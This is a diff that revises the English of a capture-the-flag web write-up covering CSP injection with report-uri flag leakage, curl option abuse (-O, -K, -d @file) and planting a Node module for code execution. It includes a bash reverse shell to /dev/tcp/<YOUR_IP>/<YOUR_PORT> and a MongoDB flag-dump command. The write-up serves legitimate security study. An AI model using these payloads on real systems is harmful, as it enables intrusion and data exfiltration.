@@ -564,7 +564,7 @@ The contents of the `tests` array are the same as the test cases displayed on th
 
 ### Codebox:
 
-The backend code extracts the img tags from `req.query.code`, and adds their `src` attributs to the CSP header. Here you can inject a semicolon. In other words, you can append any CSP directive.
+The backend code extracts the img tags from `req.query.code`, and adds their `src` attributs to the CSP header. Here we can inject a semicolon. In other words, we can append any CSP directive.
 
 ```javascript
     const csp = [
@@ -622,7 +622,8 @@ The code for setting the flag on the front end is as follows:
 
 The flag is directly written into the DOM through innerHTML. If `require-trusted-types-for 'script'` is specified in the CSP header, the assignment of the innerHTML will violate the CSP directive because the string has not been processed by Trusted-Types.
 
-Violations of CSP rules can be reported to a specified URL through `report-uri` or `report-to` CSP directive, and the content reported will contain some of the details.
+Violations of CSP rules can be reported to a specified URL through `report-uri` or `report-to` CSP directive, and the content reported will contain a certain part of the details.
+
 Let's build the following payload:
 
 ```
@@ -631,7 +632,7 @@ https://codebox.mc.ax/?code=<img+src="111%3brequire-trusted-types-for+'script'%3
 
 ![](https://imgur.com/BPsIPrg.png)
 
-It's noticed that `require-trusted-types-for` is indeed violated and `report-uri` is triggered to send the error to example.com, but the error occurs in the setting of iframe srcdoc in `if (code)`, while the code that sets the flag later is not processed due to the error occurring in the same context earlier. How to avoid violating CSP in setting iframe srcdoc? The answer is not to enter `if(code)`. Let's take a look at where the `code` comes from:
+It's noticed that `require-trusted-types-for` is indeed violated and `report-uri` is triggered to send the error to example.com, but the error occurs in the setting of iframe src doc in `if (code)`, while the `code` that sets the flag later is not processed due to the error occurring in the same context earlier. How to avoid violating CSP in setting iframe srcdoc? The answer is not to enter `if(code)`. Let's take a look at where the code comes from:
 
 ```
 const code = new URL(window.location.href).searchParams.get('code');
@@ -645,7 +646,7 @@ So we can construct `?code=&code=<real_payload>` to let the frontend and backend
 
 ### Unfinished:
 
-The code is very simple, just two routes:
+The source code provided is very simple, just two routes:
 
 ```javascript
 app.post("/api/login", async (req, res) => { //...
@@ -689,43 +690,43 @@ Let's take a look at the key parts of /api/ping:
     });
 ```
 
-The code extracts 3 params from req.body: `url`, `opt` and `data`. Where `url` is verified by new `URL(url)` and the protocol must be either http or https; `opt` has a RegEx check and must be - followed by a letter; when `opt` is `-d` or `data` is one of GET/POST, they will be passed as parameters to curl. The parameters are passed to child_process.spawn, and `shell=True` is not specified in the third parameter, so `cmd` or `$(cmd)` cannot be injected into the parameter to execute the command.
+The code extracts 3 params from req.body: `url`, `opt` and `data`. Where `url` is verified by new `URL(url)` and the protocol must be either http or https; `opt` has a RegEx check and must be - followed by a letter; when `opt` is `-d` or `data` is one of GET/POST, they will be passed as parameters to curl. The parameters are passed to child_process.spawn, and `shell=True` is not specified in the third parameter, so `cmd` or `$(cmd)` cannot be injected into the parameter to achieve RCE.
 
-That is to say, the commands we can execute look like this:
+So the commands we can execute look like this:
 
 ```
 curl http(s)://<any URL> -d <any content>
 curl http(s)://<any URL> -<a letter> <GET or POST>
 ```
 
-It is a very common CTF problem that curl parameters are controllable. Common uses include:
+`curl` with controllable parameters are quite prevalent in recent CTFs. There are a few ways to exploit it:
 
-`-O <path>` write to file
+`-O <path>` write response to file
 
-`-K <path>` specifies curlrc, which can contain any curl parameters
+`-K <path>` load curlrc which can contain any curl parameters
 
-`-d @/path/to/file` POST the file to the specified URL
+`-d @/path/to/file` POST local file to remote URL
 
-The -O and -K are used here, first `-O GET` to save the following content to `/tmp/GET`,
+The -O and -K are used to solve this challenge. Firstly, use `-O GET` to save the following content to `/tmp/GET`:
 
 ```
 create-dirs
 output="/home/user/.node_modules/kerberos.js"
 ```
 
-Then `-K GET` loads it as curlrc, which is equivalent to specifying any and multiple curl parameters, that is, specifying `--create-dirs --output=/home/user/.node_modules/kerberos.js`, put the following content Save to kerberos.js:
+Then use `-K GET` to load it as curlrc, which allows us to specify multiple curl parameters. In this case, we will pass `--create-dirs --output=/home/user/.node_modules/kerberos`.js to curl, and save the following content kerberos.js:
 
 ```
 require('child_process').exec('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1"')
 ```
 
-Trigger a node process crash, and require will load this `/home/user/.node_modules/kerberos.js` when restarting
+Then we trigger a node process crash, and after a restart, `require` will load `/home/user/.node_modules/kerberos.js `
 
-How did this `/home/user/.node_modules/kerberos.js` come from? Use strace to see what will be loaded when required in nodejs
+Where did this `/home/user/.node_modules/kerberos.js` come from? Let's use `strace` to see what will be loaded when `require` is called in nodejs:
 
 ![](https://imgur.com/9TCOYO9.png)
 
-There are three lines of requirement in the app.js given in the title:
+There are three lines of `require` in the app.js:
 
 ```javascript
 const { MongoClient } = require("mongodb");
@@ -733,9 +734,9 @@ const cp = require('child_process');
 const express = require("express");
 ```
 
-Normally, after npm install, these three lines of require must work normally, but some non-nodejs native libraries such as mongodb will try to load other libraries to enrich their own functions (optional features). The search order of require is the current directory first and then $HOME. The kerberos.js here may be loaded by express or mongodb. I didn’t check it for details.
+Usually, after `npm install`, these three lines of require work as intented, but some non-native libraries such as mongodb might try to load other third-party libraries for optional features. The search order of `require` is cwd first and then $HOME. The kerberos.js here may be loaded by express.js or mongodb. I didn’t dive into the sources to find out.
 
-In addition, in the Dockerfile of this question, the user was switched before the node process was finally started, and the file added to the container was added by the root user
+Another thing to notice is that, in the provided Dockerfile, the user was switched before the node process started, and before that, the js files was added by root.
 
 ```
 WORKDIR /app
@@ -750,12 +751,13 @@ USER user
 CMD ["/bin/sh", "-c", "while true; do node app.js; done"]
 ```
 
-So there is no permission to directly overwrite the files under /app/. The only places where the user has permission to write are /home/user/ (thanks to `useradd -m` :create the user's home directory if it does not exist) and /tmp. Only then can there be a guess that writing files under $HOME will be loaded.
+This means `user` does not have permission to overwrite any file under /app/. The only places where the user has permission to write are /home/user/ (thanks to `useradd -m`: create the user's home directory if it does not exist) and /tmp/. Thus, it's reasonable to make an assumption that files written under $HOME will  somehow be loaded.
 
-After RCE rebounds the shell, connect to mongodb to read the flag according to the clues in the dockerfile:
+After getting a reverse shell from RCE, we can connect to mongodb to read the flag, according to the information provided in the Dockerfile:
 
 ```
 node -e '(async _ =>{const { MongoClient } = require("mongodb"); const client = new MongoClient("mongodb://mongodb:27017/"); q = await client.db("secret").collection("flag").find().toArray(); console.log(q);})()'
+```
 ```
 
 ### jwtjail:
